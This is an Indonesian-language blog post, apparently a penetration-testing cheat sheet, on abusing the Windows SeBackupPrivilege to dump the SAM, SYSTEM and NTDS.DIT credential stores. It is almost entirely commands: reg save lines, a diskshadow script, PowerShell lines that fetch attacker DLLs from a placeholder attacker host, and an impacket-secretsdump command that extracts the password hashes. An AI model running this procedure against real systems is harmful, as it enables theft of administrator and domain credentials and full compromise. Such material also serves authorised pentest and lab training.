---
title: "[Windows PrivEsc] SeBackupPrivilege - Dump SAM, SYSTEM, and NTDS.DIT"
author: "novran"
date: 2024-11-20 00:00:00 +0700
categories: [Windows Privilege Escalation]
tags: [Windows Privilege Escalation]
image:
  path: /images/2024-11-20-windows-privilege-escalation-sebackupprivilege-dump-sam-system-ntds-dit-banner.png
---

Privilege `SeBackupPrivilege` di Windows dapat dimanfaatkan untuk eskalasi hak akses (Privilege Escalation) karena dengan ini pengguna memiliki kekuatan untuk melakukan operasi backup, termasuk membaca file atau direktori apa pun yang ada di sistem. Dengan ini kita dapat melakukan backup pada file `SAM`, `SYSTEM`, dan `NTDS.DIT` yang pada dasarnya file-file tersebut menyimpan kredensial yang tersimpan di dalam Operating System (termasuk kredensial milik Administrator sekali pun).

## Dump

### 1. Backup SAM

```
reg save HKLM\SAM C:\Windows\temp\SAM.bak
```

### 2. Backup SYSTEM

```
reg save HKLM\SYSTEM C:\Windows\temp\SYSTEM.bak
```

### 3. Backup NTDS.DIT

Untuk melakukan backup `NTDS.DIT` itu sedikit rumit dibandingkan saat backup `SAM` dan `SYSTEM`. Namun, di sini saya sudah merangkumnya agar mudah dieksekusi.

1. Download [SeBackupPrivilegeCmdLets.dll](https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeCmdLets.dll).
2. Download [SeBackupPrivilegeUtils.dll](https://github.com/k4sth4/SeBackupPrivilege/raw/refs/heads/main/SeBackupPrivilegeUtils.dll).
3. Buat file `vss.dsh`:
```
set context persistent nowriters
set metadata c:\\programdata\\test.cab
set verbose on
add volume c: alias test
create
expose %test% z:
```

Eksekusi:
```powershell
iwr -uri http://<ATTACKER_HOST>/SeBackupPrivilegeCmdLets.dll -outfile C:\Windows\temp\SeBackupPrivilegeCmdLets.dll
iwr -uri http://<ATTACKER_HOST>/SeBackupPrivilegeUtils.dll -outfile C:\Windows\temp\SeBackupPrivilegeUtils.dll
iwr -uri http://<ATTACKER_HOST>/vss.dsh -outfile C:\Windows\temp\vss.dsh
cd "C:\Windows\temp"
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
diskshadow /s C:\\Windows\\temp\\vss.dsh
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit C:\\Windows\\temp\\NTDS.DIT.bak
```

## Read Backup Files

### 1. Using Impacket-Secretsdump

Kalian bisa menjalankan command ini di mesin kalian sendiri (dengan catatan file-file yang di-backup sudah dipindahkan ke mesin kalian).

```bash
impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -ntds NTDS.DIT.bak LOCAL
```
